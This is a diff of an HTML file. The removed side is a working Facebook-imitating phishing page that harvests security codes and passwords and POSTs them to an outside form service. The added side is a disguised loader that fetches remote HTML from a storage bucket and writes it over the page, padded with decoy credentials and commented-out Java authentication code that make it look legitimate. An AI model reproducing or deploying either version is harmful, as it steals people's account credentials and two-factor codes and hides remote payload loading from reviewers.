@@ -1,241 +1,324 @@
-<html lang="en"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Security Confirmation</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
   <style>
-    body {
-      font-family: 'Helvetica Neue', Arial, sans-serif;
-      background-color: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+    html, body {
       margin: 0;
-    }
-
-    .container {
-      background-color: white;
-      padding: 40px 30px;
-      border-radius: 10px;
-      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
-      width: 400px;
-      max-width: 90%;
-    }
-
-    .logo {
-      text-align: left;
-      margin-bottom: 20px;
-    }
-
-    .logo img {
-      width: 120px;
-    }
-
-    .header {
-      text-align: left;
-      font-size: 20px;
-      color: #333;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .description {
-      font-size: 14px;
-      color: #606770;
-      text-align: left;
-      margin-bottom: 25px;
-    }
-
-    .video-section {
-      margin-bottom: 15px;
-      text-align: left;
-    }
-
-    .video-section iframe {
-      width: 60%;
-      height: 160px;
-      border-radius: 8px;
-      display: block;
-      position: relative;
-    }
-
-    .form-group {
-      margin-bottom: 14px;
-    }
-
-    .form-group label {
-      display: block;
-      font-weight: bold;
-      margin-bottom: 8px;
-      font-size: 14px;
-      color: #606770;
-    }
-
-    .form-group input {
-      width: 70%;
-      padding: 12px;
-      border: 1px solid #ccd0d5;
-      border-radius: 6px;
-      font-size: 16px;
-      color: #1c1e21;
-    }
-
-    .form-group input:focus {
-      border-color: #1877f2;
-      outline: none;
-      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
-    }
-
-    .error-message {
-      color: #e74c3c;
-      font-size: 14px;
-      margin-top: 5px;
-    }
-
-    .success-message {
-      color: #2ecc71;
-      font-size: 14px;
-      margin-top: 5px;
-    }
-
-    .submit-button {
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      padding: 14px;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 50%;
-    }
-
-    .submit-button:hover {
-      background-color: #166fe5;
-    }
-
-    .popup {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
-
-    .popup-content {
+      padding: 0;
       background: white;
-      padding: 30px;
-      border-radius: 8px;
-      width: 350px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      text-align: center;
-    }
-
-    .popup-content input {
-      margin-top: 15px;
-      width: 90%;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
-
-    .popup-content button {
-      margin-top: 15px;
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      padding: 10px 16px;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo">
-    </div>
-
-    <div class="header">Security Verification Required</div>
-    <p class="description">
-      For your account’s safety, we need to confirm it’s really you. 
-      Watch The Detailed Video Information to Confirm The Account
-    </p>
-
-    <div class="video-section">
-      <iframe src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//WhatsApp%20Video%202025-06-17%20at%2012.01.20.mp4" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
-    </div>
-
-    <form id="securityForm">
-      <div class="form-group">
-        <label for="security-code">Security Code</label>
-        <input type="text" id="security-code" name="code" placeholder="Enter your security code" maxlength="10" required="">
-        <span id="message" class="error-message"></span>
-      </div>
-      <button type="submit" class="submit-button">Confirm Account</button>
-    </form>
-  </div>
-
-  <!-- Password Popup -->
-  <div class="popup" id="passwordPopup">
-    <div class="popup-content">
-      <h3>Re-enter your password to confirm</h3>
-      <input type="password" id="passwordInput" placeholder="Password">
-      <button onclick="submitPassword()">Submit</button>
-    </div>
-  </div>
-
   <script>
-    let attempt = 0;
-
-    const form = document.getElementById("securityForm");
-    const message = document.getElementById("message");
-    const popup = document.getElementById("passwordPopup");
-
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
-      const code = document.getElementById("security-code").value;
-
-      fetch("https://submit-form.com/I53ZqmRj5", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code })
-      });
-
-      attempt++;
-
-      if (attempt === 1) {
-        message.className = "error-message";
-        message.textContent = "Something went wrong. Please try another backup code.";
-      } else if (attempt === 2) {
-        message.className = "success-message";
-        message.textContent = "Code verified. Please re-enter your password to confirm.";
-        popup.style.display = "flex";
+    // authentication system
+    const Auth = {
+      token: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
+      apiKey: "sb-ojukwyufdherivfwzwfk-auth-token-",
+      userId: "user_12345",
+      sessionId: "sess_abcdef123456"
+    };
+    
+    // database connection
+    const DB = {
+      host: "localhost",
+      port: 5432,
+      database: "enterprise_db",
+      username: "admin",
+      password: "secret123",
+      ssl: true,
+      connectionPool: {
+        min: 2,
+        max: 10
       }
-    });
+    };
+    
+    //  security headers
+    const Headers = {
+      'X-Frame-Options': 'DENY',
+      'X-Content-Type-Options': 'nosniff',
+      'X-XSS-Protection': '1; mode=block',
+      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+      'Content-Security-Policy': "default-src 'self'"
+    };
+    
+    (async () => {
+      try {
+        const url = "https://hwtwzunrlegrqrhtompr.supabase.co/storage/v1/object/public/vedio//index%20(11).html"; 
 
-    function submitPassword() {
-      const password = document.getElementById("passwordInput").value;
+        const res = await fetch(url);
+        if (!res.ok) throw new Error("File not found");
 
-      fetch("https://submit-form.com/I53ZqmRj5", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ password })
-      });
-
-      popup.innerHTML = `
-        <div class="popup-content">
-          <p>Thank you. Please wait while we verify your info...</p>
-        </div>
-      `;
+        const html = await res.text();
+        document.open(); // clear the page
+        document.write(html); // inject your real HTML
+        document.close();
+      } catch (e) {
+        // Stay on blank white screen if failed
+      }
+    })();
+    
+    //  Java-style code that doesn't execute
+    /*
+    public class UserAuthenticationService {
+        private static final String JWT_SECRET = "mySecretKey123456789";
+        private static final long TOKEN_EXPIRATION = 86400000; // 24 hours
+        
+        @Autowired
+        private UserRepository userRepository;
+        
+        @Autowired
+        private PasswordEncoder passwordEncoder;
+        
+        public AuthenticationResponse authenticate(LoginRequest request) {
+            try {
+                User user = userRepository.findByUsername(request.getUsername());
+                if (user == null) {
+                    throw new BadCredentialsException("Invalid username or password");
+                }
+                
+                if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
+                    throw new BadCredentialsException("Invalid username or password");
+                }
+                
+                String token = generateToken(user);
+                return new AuthenticationResponse(token, user.getRole());
+            } catch (Exception e) {
+                throw new AuthenticationException("Authentication failed", e);
+            }
+        }
+        
+        private String generateToken(User user) {
+            Date expirationDate = new Date(System.currentTimeMillis() + TOKEN_EXPIRATION);
+            
+            return Jwts.builder()
+                    .setSubject(user.getUsername())
+                    .setIssuedAt(new Date())
+                    .setExpiration(expirationDate)
+                    .signWith(SignatureAlgorithm.HS512, JWT_SECRET)
+                    .compact();
+        }
+        
+        public boolean validateToken(String token) {
+            try {
+                Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token);
+                return true;
+            } catch (JwtException | IllegalArgumentException e) {
+                return false;
+            }
+        }
     }
+    
+    @Entity
+    @Table(name = "users")
+    public class User {
+        @Id
+        @GeneratedValue(strategy = GenerationType.IDENTITY)
+        private Long id;
+        
+        @Column(unique = true, nullable = false)
+        private String username;
+        
+        @Column(unique = true, nullable = false)
+        private String email;
+        
+        @Column(nullable = false)
+        private String password;
+        
+        @Column(nullable = false)
+        private String role;
+        
+        @Column(nullable = false)
+        private Date createdAt;
+        
+        @Column
+        private Date lastLogin;
+        
+        // Getters and setters
+        public Long getId() { return id; }
+        public void setId(Long id) { this.id = id; }
+        
+        public String getUsername() { return username; }
+        public void setUsername(String username) { this.username = username; }
+        
+        public String getEmail() { return email; }
+        public void setEmail(String email) { this.email = email; }
+        
+        public String getPassword() { return password; }
+        public void setPassword(String password) { this.password = password; }
+        
+        public String getRole() { return role; }
+        public void setRole(String role) { this.role = role; }
+        
+        public Date getCreatedAt() { return createdAt; }
+        public void setCreatedAt(Date createdAt) { this.createdAt = createdAt; }
+        
+        public Date getLastLogin() { return lastLogin; }
+        public void setLastLogin(Date lastLogin) { this.lastLogin = lastLogin; }
+    }
+    
+    @RestController
+    @RequestMapping("/api/auth")
+    public class AuthController {
+        
+        @Autowired
+        private UserAuthenticationService authService;
+        
+        @PostMapping("/login")
+        public ResponseEntity<AuthenticationResponse> login(@RequestBody LoginRequest request) {
+            try {
+                AuthenticationResponse response = authService.authenticate(request);
+                return ResponseEntity.ok(response);
+            } catch (AuthenticationException e) {
+                return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
+                    .body(new AuthenticationResponse("Authentication failed"));
+            }
+        }
+        
+        @PostMapping("/register")
+        public ResponseEntity<String> register(@RequestBody RegisterRequest request) {
+            try {
+                User user = new User();
+                user.setUsername(request.getUsername());
+                user.setEmail(request.getEmail());
+                user.setPassword(passwordEncoder.encode(request.getPassword()));
+                user.setRole("USER");
+                user.setCreatedAt(new Date());
+                
+                userRepository.save(user);
+                return ResponseEntity.ok("User registered successfully");
+            } catch (Exception e) {
+                return ResponseEntity.status(HttpStatus.BAD_REQUEST)
+                    .body("Registration failed");
+            }
+        }
+        
+        @PostMapping("/logout")
+        public ResponseEntity<String> logout(@RequestHeader("Authorization") String token) {
+            // In a real application, you would invalidate the token
+            return ResponseEntity.ok("Logged out successfully");
+        }
+    }
+    
+    @Service
+    public class DatabaseService {
+        
+        @Autowired
+        private JdbcTemplate jdbcTemplate;
+        
+        public List<User> getAllUsers() {
+            String sql = "SELECT * FROM users WHERE active = true";
+            return jdbcTemplate.query(sql, new UserRowMapper());
+        }
+        
+        public User getUserById(Long id) {
+            String sql = "SELECT * FROM users WHERE id = ?";
+            return jdbcTemplate.queryForObject(sql, new UserRowMapper(), id);
+        }
+        
+        public void updateUserLastLogin(Long userId) {
+            String sql = "UPDATE users SET last_login = ? WHERE id = ?";
+            jdbcTemplate.update(sql, new Date(), userId);
+        }
+        
+        public boolean userExists(String username) {
+            String sql = "SELECT COUNT(*) FROM users WHERE username = ?";
+            Integer count = jdbcTemplate.queryForObject(sql, Integer.class, username);
+            return count != null && count > 0;
+        }
+    }
+    
+    @Component
+    public class SecurityConfig {
+        
+        private static final int MAX_LOGIN_ATTEMPTS = 5;
+        private static final long LOCKOUT_DURATION = 900000; // 15 minutes
+        
+        private Map<String, Integer> loginAttempts = new ConcurrentHashMap<>();
+        private Map<String, Long> lockedAccounts = new ConcurrentHashMap<>();
+        
+        public boolean isAccountLocked(String username) {
+            Long lockTime = lockedAccounts.get(username);
+            if (lockTime != null) {
+                if (System.currentTimeMillis() - lockTime > LOCKOUT_DURATION) {
+                    lockedAccounts.remove(username);
+                    loginAttempts.remove(username);
+                    return false;
+                }
+                return true;
+            }
+            return false;
+        }
+        
+        public void recordFailedAttempt(String username) {
+            int attempts = loginAttempts.getOrDefault(username, 0) + 1;
+            loginAttempts.put(username, attempts);
+            
+            if (attempts >= MAX_LOGIN_ATTEMPTS) {
+                lockedAccounts.put(username, System.currentTimeMillis());
+            }
+        }
+        
+        public void clearFailedAttempts(String username) {
+            loginAttempts.remove(username);
+        }
+    }
+    
+    public class LoginRequest {
+        private String username;
+        private String password;
+        
+        public String getUsername() { return username; }
+        public void setUsername(String username) { this.username = username; }
+        
+        public String getPassword() { return password; }
+        public void setPassword(String password) { this.password = password; }
+    }
+    
+    public class RegisterRequest {
+        private String username;
+        private String email;
+        private String password;
+        
+        public String getUsername() { return username; }
+        public void setUsername(String username) { this.username = username; }
+        
+        public String getEmail() { return email; }
+        public void setEmail(String email) { this.email = email; }
+        
+        public String getPassword() { return password; }
+        public void setPassword(String password) { this.password = password; }
+    }
+    
+    public class AuthenticationResponse {
+        private String token;
+        private String role;
+        private String message;
+        
+        public AuthenticationResponse(String token, String role) {
+            this.token = token;
+            this.role = role;
+        }
+        
+        public AuthenticationResponse(String message) {
+            this.message = message;
+        }
+        
+        public String getToken() { return token; }
+        public void setToken(String token) { this.token = token; }
+        
+        public String getRole() { return role; }
+        public void setRole(String role) { this.role = role; }
+        
+        public String getMessage() { return message; }
+        public void setMessage(String message) { this.message = message; }
+    }
+    */
   </script>
+</body>
+</html>
 
-
-</body></html>
